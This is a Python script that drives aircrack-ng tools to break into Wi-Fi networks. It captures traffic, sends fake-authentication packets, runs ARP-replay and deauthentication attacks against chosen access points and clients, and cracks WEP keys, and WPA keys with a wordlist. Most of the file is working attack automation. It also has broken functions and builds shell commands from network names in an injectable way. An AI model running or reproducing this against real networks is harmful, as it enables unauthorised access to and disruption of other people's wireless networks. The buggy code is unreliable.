#!/usr/bin/python
# -*- coding: utf-8 -*-

import time
import os
import signal
import subprocess
import logging
import threading
import re

def monitoring():
    """
    Start the monitoring
    """
    res = False
    logging.info("Running 'airmong-ng'..")
    cmd_only_airmon = subprocess.check_output(["airmon-ng"])
    fichier = open("airmon.txt", "w")
    fichier.write(cmd_only_airmon)
    fichier.close()
    fichier = open("airmon.txt", "r")
    file_line = fichier.readline()
    wlan_wanted = ""
    while file_line != "":
        file_line = fichier.readline()
        if "rt2800" in file_line:
            logging.info("Found a rt2800 !")
            wlan_wanted = file_line[:5].replace(" ", "")
            res = True
        else:
            logging.info("Haven't found any rt2800.. cannot continue..")
    cmd_monitoring = subprocess.check_output(["airmon-ng", "start", wlan_wanted])
    return res

def global_listening():
    """
    gobal listening
    Start airodump-ng
    """
    logging.info("Global listening. File are recorded into TestBox/global folder.")
    cmd = "airodump-ng -w TestBox/global/record mon0"
    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def network_listening(registered_network):
    """
    private listening (on one box only)
    :param registered_network: box (network) we are listening
    """
    BSSID = registered_network._BSSID
    ESSID = registered_network._ESSID
    Channel = registered_network._Channel
    logging.info("Network listening. File are recorded into TestBox/%s folder.", ESSID)

    cmd = "airodump-ng -w TestBox/" + ESSID + "/record -d " + BSSID + " mon0 --channel " + str(Channel) +" --ignore-negative-one"

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)

    return pro.pid

def keep_alive_packet(box):
    """
    create a link between the box and us to increase of chance of success
    :param box: box we are trying to be linked with
    """
    BSSID = box._BSSID
    ESSID = box._ESSID
    logging.info("Sending keep alive paquets to %s", ESSID)
    cmd = "aireplay-ng -1 6000 -o 1 -q 10 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one"
    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def arp_attack(registered_network):
    """
    start of the arp attack
    :param registered_network: box (network) we are attacking
    """
    BSSID = registered_network._BSSID
    ESSID = registered_network._ESSID
    Channel = registered_network._Channel
    logging.info("Arp attack on %s", ESSID)

    cmd = "aireplay-ng -3 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one";

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def deauthentication_attack(box, client):
    """
    start a deauthentication attack to generate traffic
    :param box: box we are attacking
    :param box: client who is attacked
    """
    BSSID = box._BSSID
    mac_client = client._MAC_CLIENT
    logging.info("Deauthentication on [%s | %s]", BSSID, mac_client)
    cmd = "aireplay-ng -0 10 -a " + BSSID + " -c " + mac_client + " mon0 --ignore-negative-one"

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def result_aircrack_wep(data_file_path):
    """
    obsolete
    start to find the key and if found, write it in key.result
    :param datafile_path: the path to the box directory
    """
    t_aircrack = threading.Thread(target=aircrack_final_wep, args=(datafile_path,))
    key_file_name = datafile_path + ".result"
    KEY = ""
    t.start()
    while KEY == "":
        KEY = get_key(datafile_path)
        time.sleep(5)
    os.remove(key_file_name)
    cmd = "echo \" WEP_box_path : " + datafile_path + " with key " + KEY + "\" >> key.result"
    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def result_aircrack_wpa(datafile_path):
    """
    obsolete
    start to find the key and if found, write it in key.result
    :param datafile_path: the path to the box directory
    """
    t_aircrack = threading.Thread(target=aircrack_final_wpa, args=(datafile_path,))
    key_file_name = datafile_path + ".result"
    KEY = ""
    while KEY == "" :
        if t_aircrack.isAlive() == False :
            logging.warning("%s n'a pas reussi à lancer Aircrack-ng", datafile_path)
            t_aircrack = threading.Thread(target=aircrack_final_wpa, args=(datafile_path,))
            t_aircrack.start()
        KEY = get_key(datafile_path)
        time.sleep(5)
    os.remove(key_file_name)
    cmd = "echo \" WPA_box_path : " + datafile_path + " with key " + KEY + "\" >> key.result"
    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def aircrack_final_wep(datafile_path):
    """
    start to find the key and if found, write it in key.result
    :param datafile_path: the path to the box directory
    """
    logging.info("Applying aircrack for WEP on %s", datafile_path)
    cmd = "aircrack-ng " + datafile_path + "/*.cap > " + datafile_path + ".result"

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro

def aircrack_final_wpa(datafile_path):
    """
    start to find the key and if found, write it in key.result
    :param datafile_path: the path to the box directory
    """
    logging.info("Applying aircrack for WPA on %s", datafile_path)
    cmd = "aircrack-ng -w dictionnaire/test " + datafile_path + "/*.cap > " +  datafile_path + ".result"

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro

def get_key(datafile_path):
    """
    search if the key is found in a file
    :param datafile_path: The path to the file in the box directory
    """
    file_name = datafile_path + ".result"
    key = ""
    pattern = re.compile("KEY FOUND! \[ [^!]+ \]")
    try:
        fichier = open(file_name, 'r')
        file_line = fichier.readline()
        while file_line != "" and key == "":
            res = pattern.search(file_line)
            if res != None:
                key = file_line[res.start():res.end()]
            file_line = fichier.readline()
    except:
        pass
    return key
